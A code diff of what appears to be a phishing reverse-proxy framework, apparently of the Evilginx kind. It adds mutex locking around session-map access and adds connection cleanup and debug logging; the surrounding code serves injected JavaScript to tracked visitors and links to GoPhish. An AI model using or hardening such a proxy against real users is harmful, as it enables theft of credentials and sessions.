@@ -224,7 +224,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					js_id := ra[2]
 					if strings.HasSuffix(js_id, ".js") {
 						js_id = js_id[:len(js_id)-3]
-						if s, ok := p.sessions[session_id]; ok {
+						p.session_mtx.Lock()
+					s, ok := p.sessions[session_id]
+					p.session_mtx.Unlock()
+					if ok {
 							var d_body string
 							var js_params *map[string]string = nil
 							js_params = &s.Params
@@ -249,7 +252,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if strings.HasSuffix(session_id, ".js") {
 						// respond with injected javascript
 						session_id = session_id[:len(session_id)-3]
-						if s, ok := p.sessions[session_id]; ok {
+						p.session_mtx.Lock()
+					s, ok := p.sessions[session_id]
+					p.session_mtx.Unlock()
+					if ok {
 							var d_body string
 							if !s.IsDone {
 								if s.RedirectURL != "" {
@@ -264,7 +270,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Warning("js: session not found: '%s'", session_id)
 						}
 					} else {
-						if _, ok := p.sessions[session_id]; ok {
+						p.session_mtx.Lock()
+						_, ok := p.sessions[session_id]
+						p.session_mtx.Unlock()
+						if ok {
 							redirect_url, ok := p.waitForRedirectUrl(session_id)
 							if ok {
 								type ResponseRedirectUrl struct {
@@ -309,7 +318,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					var ok bool = false
 					sc, err := req.Cookie(session_cookie)
 					if err == nil {
+						p.session_mtx.Lock()
 						ps.Index, ok = p.sids[sc.Value]
+						p.session_mtx.Unlock()
 						if ok {
 							create_session = false
 							ps.SessionId = sc.Value
@@ -399,8 +410,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
+									
+									p.session_mtx.Lock()
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
+									p.session_mtx.Unlock()
 
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										rid, ok := session.Params["rid"]
@@ -1616,17 +1630,25 @@ func (p *HttpProxy) httpsWorker() {
 		}
 
 		go func(c net.Conn) {
+			defer func() {
+				if err := c.Close(); err != nil {
+					log.Debug("error closing connection: %v", err)
+				}
+			}()
+			
 			now := time.Now()
 			c.SetReadDeadline(now.Add(httpReadTimeout))
 			c.SetWriteDeadline(now.Add(httpWriteTimeout))
 
 			tlsConn, err := vhost.TLS(c)
 			if err != nil {
+				log.Debug("TLS handshake error: %v", err)
 				return
 			}
 
 			hostname := tlsConn.Host()
 			if hostname == "" {
+				log.Debug("empty hostname in TLS connection")
 				return
 			}
 
